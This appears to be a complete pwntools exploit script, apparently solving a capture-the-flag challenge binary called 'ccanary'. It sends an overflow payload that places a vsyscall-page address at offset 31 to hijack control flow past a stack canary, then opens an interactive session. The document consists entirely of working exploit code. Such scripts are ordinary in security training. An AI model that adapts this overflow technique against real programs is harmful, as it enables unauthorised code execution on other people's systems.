#!/usr/bin/env python3
from pwn import *

with process(["./ccanary"]) as tube:
    tube.sendlineafter(
        "quote>",
        flat(
            {
                31: struct.pack("<QI", 0xFFFFFFFFFF600000 + 0x400, 1),
            }
        ),
    )
    tube.interactive()
